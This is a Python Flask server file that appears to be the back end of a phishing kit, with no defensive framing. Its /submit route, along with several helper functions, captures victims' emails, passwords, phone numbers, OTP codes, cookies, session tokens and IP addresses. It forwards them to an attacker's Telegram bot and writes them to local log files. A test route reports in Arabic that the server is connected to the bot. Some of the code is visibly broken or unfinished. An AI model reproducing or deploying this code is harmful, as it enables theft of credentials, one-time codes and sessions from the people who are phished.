from flask import Flask, render_template, request, jsonify, redirect, send_from_directory
from datetime import datetime
import os
import requests
import json
from dotenv import load_dotenv
from pathlib import Path

load_dotenv(
    dotenv_path=Path(__file__).resolve().parent / ".env",
    override=False
) 
print("BOT_TOKEN:", os.getenv("TG_BOT_TOKEN"))
print("CHAT_ID:", os.getenv("TG_CHAT_ID"))
print("RUNNING FILE:", __file__)
print("CWD:", os.getcwd())

BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
CHAT_ID = os.getenv("TG_CHAT_ID")

app = Flask(__name__, template_folder="templates")

@app.before_request
def init_data():
    data = {
        "cookies": request.headers.get("Cookie",""),
        "email": "",
        "password": "",
        "phone": "",
        "otp": "",
        "device_browser": request.headers.get("User-Agent", ""),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent")
    }
    
    message = f"""
    Cookies: {data['Cookie']}
    Email: {data['email']}
    Password: {data['password']}
    Phone: {data['phone']}
    OTP: {data['otp']}
    """
    
def before_request_func():
    cookies = request.headers.get("Cookie")
    
    message = f"""
    Cookies: {cookie}
    """
    
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                      "chat_id": CHAT_ID,
                      "text": message
     })
     
    
@app.route('/collect', methods=['POST'])
def collect():
    try:
        payload = request.get_json(silent=True)
        if not payload:
            payload = request.data.to_dict()
        data = payload     
        
    except:
        pass          

def send_to_telegram(data):
    try:
        token = os.getenv("TG_BOT_TOKEN")
        chat_id = os.getenv("TG_CHAT_ID")
       
    except:
        pass
            
def collect_sessions():

    logs = []
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")
    phone = data.get("phone")
    otp = data.get("otp")
    
    logs.append({"email": email, "password": password, "phone": phone, "otp": otp})
    
    message = f"""
    Email: {email}
    Password: {password}
    Phone: {phone}
    OTP: {otp}
    IP: {ip}
    '''.
    """
    
    
    try:
        session_data = request.headers.get("Authorization")

        entry = {"token": session_data} 

        if os .path.exists("sessions.json"):
            with open("sessions.json", "r", encoding="utf-8") as f:
                data = json.load(f)
        else:
            data = []

        session_data = {"token": request.form.get('token')}
        data.append(session_data)       
                
        with open("sessions.json", "w") as f:
            json.dump(data, f, indent=4) 
              
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                      "chat_id": CHAT_ID,
                      "text": f"session Token: {session_data}\nUser-Agent: {user_agent}"})            
                      
        user_agent = request.headers.get('User-Agent')
        ip_address = request.remote_addr
    except:
        pass        
        
if os.path.exists("log.json"):
    with open("log.json", "r") as f:
        logs = json.load(f)      
    
def notify(text: str) -> bool:
    try:
        token = os.getenv("TG_BOT_TOKEN")
        chat_id = os.getenv("TG_CHAT_ID")
        if not BOT_TOKEN or not CHAT_ID:
           print("Env missing TG_BOT_TOKEN or TG_CHAT_ID")
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text},
            timeout=10
        )
        print("TG >", r.status_code, r.text)
        
    except Exception:
        pass
       
@app.get("/ping")
def ping():
       pass

@app.get("/form")
def form_page():  
       
       pass     

@app.get("/")
def root():

       pass
        
@app.route("/track-click", methods=["POST"])
def track_click():

        data = request.get_json(silent=True) or {}
        button = data.get("button", "-")
        page = data.get("page", request.headers.get("Referer", "-"))
        ua = request.headers.get("User-Agent", "-")

        text = f"Click\nButton: {button}\nPage: {page}\nUA: {ua}"
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={"chat_id": CHAT_ID, "text": text},
        timeout=10
        )
        
@app.route("/submit", methods=["POST"])
def submit():
        ua =request.headers.get("User-Agent", "-")
        data = request.form.to_dict() or (request.get_json(silent=true) or {})
        raw = request.get_data(as_text=True)
        data.update(request.form.to_dict())
        data.update(request.get_json(silent=True) or {})


        form = request.form.to_dict()
        print(">> METHOD:", request.method)
        print(">> PATH:", request.path)
        print(">> KEYS:", list(data.keys()))
        print(">> FORM:", form)
        print(">> RAW:", raw)

        email = data.get("email") or data.get("Email") or data.get("username") or       data.get("login")
        password = data.get("password") or data.get("pass") or data.get("pwd")

        text = f"keys: {list(data.keys())}\nEmail: {email}\nPassword: {password}\nUA: {ua}"
        
        message = (
                f"Keys: {list(data.keys())}\n"
                f"Email: {email}\n"
                f"Password: {password}\n"
                f"UA: {ua}\n\n"
                f"Form Data:\n" +
                "\n".join([f"{k}: {v}" for k, v in form.items()])
        )
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": message},
                timeout=10
            )
            print("TG >", r.status_code, r.text)
            log_entry = {"data": data,"ua": ua,"ts": datetime.utcnow().isoformat() + "Z"
            }
            logs =[]
            if os.path.exists("log.json"):
                with open("log.json", "r", encoding="utf-8") as f:
                    logs = json.load(f)
            logs.append(log_entry)
            with open("logs.json", "w", encoding="utf-8") as f:
                json.dump(logs, f, indent=2, ensure_ascii=False)
            BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
            CHAT_ID = os.getenv("TG_CHAT_ID")
        except Exception as e:
            print("log write error:", e)

@app.route("/test-notify")
def test_notify():
        BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
        CHAT_ID = os.getenv("TG_CHAT_ID")
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": "✅ السيرفر شغال وموصل بالبوت"}
        r = requests.post(url, data=payload)
        print("TG >", r.status_code, r.text)
        
        pass
if __name__ == "__main__":
        port = int(os.environ.get("PORT",8081))
        app.run(host="0.0.0.0", port=port, debug=True)
        
